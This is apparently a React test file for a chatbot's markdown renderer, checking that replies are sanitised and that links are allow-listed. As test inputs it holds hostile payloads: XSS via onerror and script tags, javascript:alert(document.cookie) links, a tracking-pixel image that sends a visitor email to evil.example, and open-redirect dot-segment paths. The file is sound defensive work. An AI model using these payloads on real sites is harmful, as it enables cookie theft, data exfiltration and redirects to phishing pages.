import { describe, it, expect, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, useLocation } from "react-router-dom";
import MarkdownRenderer from "./MarkdownRenderer";
import { createChatLinkPolicy, type ChatLinkPolicy } from "./chatLinks";
import { POPULATED } from "@/services/chatbot-facts.fixtures";

function LocationProbe() {
  return <output data-testid="location">{useLocation().pathname}</output>;
}

function renderMd(content: string, onLinkClick = vi.fn(), classifyLink?: ChatLinkPolicy) {
  const utils = render(
    <MemoryRouter initialEntries={["/"]}>
      <MarkdownRenderer content={content} onLinkClick={onLinkClick} classifyLink={classifyLink} />
      <LocationProbe />
    </MemoryRouter>,
  );
  return { ...utils, onLinkClick, location: () => screen.getByTestId("location").textContent };
}

// jsdom cannot follow a real navigation; stop the browser default AFTER React has handled the
// click, and record whether the app itself prevented it (i.e. routed it in-app).
function clickAndReport(el: Element): Promise<{ appPrevented: boolean }> {
  return new Promise((resolve) => {
    const listener = (e: Event) => {
      const appPrevented = e.defaultPrevented;
      e.preventDefault();
      window.removeEventListener("click", listener);
      resolve({ appPrevented });
    };
    window.addEventListener("click", listener);
    void userEvent.setup().click(el);
  });
}

describe("MarkdownRenderer safety", () => {
  it("never renders raw HTML from a reply", () => {
    const { container } = renderMd('Hi <img src="x" onerror="alert(1)"> <script>alert(2)</script>');
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
  });

  // Security review integrate/s2 (LOW): a markdown image in a reply makes the browser fetch any
  // URL with no click, the classic exfiltration channel (the CSP is Report-Only).
  it("never renders a markdown image from a reply, only its alt text", () => {
    const { container } = renderMd(
      "Look ![tracking pixel](https://evil.example/p.png?d=visitor%40mail.test) and " +
        "![ref][r] and [![inner](https://evil.example/i.png)](/contact)\n\n[r]: https://evil.example/r.png",
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
    expect(screen.getByText("tracking pixel")).toBeInTheDocument();
    expect(screen.getByText("ref")).toBeInTheDocument();
    expect(screen.getByText("inner")).toBeInTheDocument();
  });

  it("renders javascript:, data:, vbscript: and mailto: links from a reply as plain text, not links", () => {
    const { container } = renderMd(
      "[alpha](javascript:alert(1)) [bravo](data:text/html,<b>x</b>) [charlie](vbscript:x) [delta](mailto:a@b.c)",
    );
    expect(container.querySelectorAll("a")).toHaveLength(0);
    for (const label of ["alpha", "bravo", "charlie", "delta"]) {
      expect(screen.getByText(label).closest("a")).toBeNull();
    }
    expect(container.innerHTML).not.toMatch(/javascript:|data:text|vbscript:|mailto:/i);
  });
});

describe("MarkdownRenderer links (STS-058 / REQ-154)", () => {
  // FF-5 changed this on purpose: //evil.tld used to render as a new-tab external link. The chat
  // allow-list now refuses any host it does not name, so it is not a link at all.
  it("does not route a protocol-relative //evil.tld link internally, nor link it at all", () => {
    const { container, onLinkClick, location } = renderMd("[Contact us](//evil.tld/contact)");
    expect(screen.queryByRole("link", { name: /contact us/i })).toBeNull();
    expect(screen.getByText("Contact us").closest("a")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.tld");
    expect(location()).toBe("/");
    expect(onLinkClick).not.toHaveBeenCalled();
  });

  it("routes /contact internally, without a new tab, and closes the chat", async () => {
    const { onLinkClick, location } = renderMd("Use our [contact form](/contact).");
    const link = screen.getByRole("link", { name: "contact form" });

    expect(link).toHaveAttribute("href", "/contact");
    expect(link).not.toHaveAttribute("target");

    const { appPrevented } = await clickAndReport(link);
    expect(appPrevented).toBe(true);
    expect(location()).toBe("/contact");
    expect(onLinkClick).toHaveBeenCalledTimes(1);
  });

  // FF-5 changed this on purpose: any https host used to be linked. Only an allow-listed host is
  // now (here the populated fixture's verified booking host); the shipped config allows none.
  it("renders an allow-listed https host as an external new-tab link with noopener noreferrer", async () => {
    const policy = createChatLinkPolicy({ business: POPULATED });
    const { onLinkClick, location } = renderMd("[site](https://booking.example.test/saraya)", vi.fn(), policy);
    const link = screen.getByRole("link", { name: /site/i });

    expect(link).toHaveAttribute("href", "https://booking.example.test/saraya");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")?.split(" ")).toEqual(expect.arrayContaining(["noopener", "noreferrer"]));
    expect(link).toHaveTextContent("(opens in a new tab)");

    const { appPrevented } = await clickAndReport(link);
    expect(appPrevented).toBe(false);
    expect(location()).toBe("/");
    expect(onLinkClick).not.toHaveBeenCalled();
  });

  // Security review integrate/s2 (MEDIUM): "/.//evil.example" used to render as
  // <a href="//evil.example"> with no target, so a middle-click or "open in new tab" left the site.
  it("never renders a dot-segment link as a protocol-relative or off-origin same-tab href", () => {
    const payloads = [
      "/.//evil.example",
      "/..//evil.example",
      "/a/..//evil.example",
      "/%2e//evil.example",
      "/%2E//evil.example",
      "/./\\evil.example",
    ];
    const { container } = renderMd(payloads.map((p, i) => `[link${i}](${p})`).join(" "));

    for (const a of Array.from(container.querySelectorAll("a"))) {
      const href = a.getAttribute("href") ?? "";
      expect(href).not.toMatch(/^[/\\]{2}/);
      // Anything that resolves off this origin must at least be a marked new-tab external link.
      if (new URL(href, window.location.href).origin !== window.location.origin) {
        expect(a).toHaveAttribute("target", "_blank");
      }
    }
    // None of the six is a link. The backslash one used to render as the same-origin path
    // "/%5Cevil.example" (react-markdown percent-encodes a raw "\"); FF-5 changed that on purpose:
    // it is not a live route, so the chat allow-list shows it as text. The raw-backslash form of
    // the shared classifier is covered in links.test.ts.
    payloads.forEach((_, i) => {
      expect(screen.getByText(`link${i}`).closest("a")).toBeNull();
    });
    expect(container.innerHTML).not.toMatch(/["'][/\\]{2}evil\.example/);
  });

  // FF-5 changed this on purpose: with booking unverified (as shipped) the Calendly URL is not on
  // the allow-list and is not linked. Once allow-listed, a booking link looks like any other link.
  it("gives no link a calendly special case", () => {
    const shipped = renderMd("[book](https://calendly.com/saraya-info)");
    expect(shipped.container.querySelector("a")).toBeNull();
    shipped.unmount();

    const policy = createChatLinkPolicy({ business: POPULATED });
    const { container } = renderMd(
      "[book](https://booking.example.test/saraya) [profile](https://social.example.test/saraya)",
      vi.fn(),
      policy,
    );
    const [booking, other] = Array.from(container.querySelectorAll("a"));
    expect(booking.className).toBe(other.className);
  });
});

describe("MarkdownRenderer chat link allow-list (FF-5)", () => {
  it("turns a bare live page path into a real in-app link and keeps the text", async () => {
    const { onLinkClick, location } = renderMd("Details: /services/local-seo and all of them: /services");
    const detail = screen.getByRole("link", { name: "/services/local-seo" });
    expect(detail).toHaveAttribute("href", "/services/local-seo");
    expect(detail).not.toHaveAttribute("target");
    expect(screen.getByRole("link", { name: "/services" })).toHaveAttribute("href", "/services");

    const { appPrevented } = await clickAndReport(detail);
    expect(appPrevented).toBe(true);
    expect(location()).toBe("/services/local-seo");
    expect(onLinkClick).toHaveBeenCalledTimes(1);
  });

  it("does not link a path that is not a live route, nor 24/7, and/or or an /api/ call", () => {
    const { container } = renderMd("Old page /solutions, open 24/7 and/or see /api/chat or [x](/not-a-page).");
    expect(container.querySelectorAll("a")).toHaveLength(0);
    expect(container).toHaveTextContent("Old page /solutions, open 24/7 and/or see /api/chat or x.");
  });

  it("deny: javascript: and an off-list https URL are never links, written either way", () => {
    const { container } = renderMd(
      "[run](javascript:alert(document.cookie)) [prize](https://evil.example/claim) " +
        "https://evil.example/bare <https://evil.example/angle> [lookalike](https://sarayatechsolutions.com.evil.example/contact)",
    );
    expect(container.querySelectorAll("a")).toHaveLength(0);
    expect(container.innerHTML).not.toMatch(/javascript:|href=/i);
    expect(screen.getByText("prize").closest("a")).toBeNull();
    // The visitor still sees what the reply said.
    expect(container).toHaveTextContent("https://evil.example/bare");
  });

  it("deny: plain http, credentials and ports on an allow-listed host are not linked", () => {
    const policy = createChatLinkPolicy({ business: POPULATED });
    const { container } = renderMd(
      "[a](http://booking.example.test/saraya) [b](https://user:pw@booking.example.test/) [c](https://booking.example.test:8443/)",
      vi.fn(),
      policy,
    );
    expect(container.querySelectorAll("a")).toHaveLength(0);
  });

  it("routes a link to this site's own host in-app, as a path, when it names a live route", async () => {
    const { container, location } = renderMd(
      "[contact](https://sarayatechsolutions.com/contact) [www](https://www.sarayatechsolutions.com/pricing) [gone](https://sarayatechsolutions.com/solutions)",
    );
    const contact = screen.getByRole("link", { name: "contact" });
    expect(contact).toHaveAttribute("href", "/contact");
    expect(contact).not.toHaveAttribute("target");
    expect(screen.getByRole("link", { name: "www" })).toHaveAttribute("href", "/pricing");
    expect(screen.getByText("gone").closest("a")).toBeNull();
    expect(container.querySelectorAll("a")).toHaveLength(2);
    await clickAndReport(contact);
    expect(location()).toBe("/contact");
  });

  it("keeps one line per bullet: a single newline is a line break", () => {
    const { container } = renderMd("We offer:\n\u2022 **Website Design**: sites\n\u2022 **Local SEO**: maps");
    expect(container.querySelectorAll("p")).toHaveLength(1);
    expect(container.querySelectorAll("p br")).toHaveLength(2);
  });

  it("never re-links text inside inline code or an existing link", () => {
    const { container } = renderMd("run `/contact` or [the /pricing page](/contact)");
    expect(container.querySelector("code")?.querySelector("a")).toBeNull();
    const links = Array.from(container.querySelectorAll("a"));
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute("href", "/contact");
    expect(links[0]).toHaveTextContent("the /pricing page");
  });
});

describe("MarkdownRenderer code", () => {
  it("renders a fenced block as plain <pre><code> keeping the text", () => {
    const { container } = renderMd("```ts\nconst a = 1;\n```");
    const code = container.querySelector("pre > code");
    expect(code).not.toBeNull();
    expect(code).toHaveTextContent("const a = 1;");
    expect(code).toHaveAttribute("data-language", "ts");
  });

  it("renders inline code without a <pre> wrapper", () => {
    const { container } = renderMd("run `npm test` now");
    expect(container.querySelector("pre")).toBeNull();
    expect(container.querySelector("code")).toHaveTextContent("npm test");
  });
});
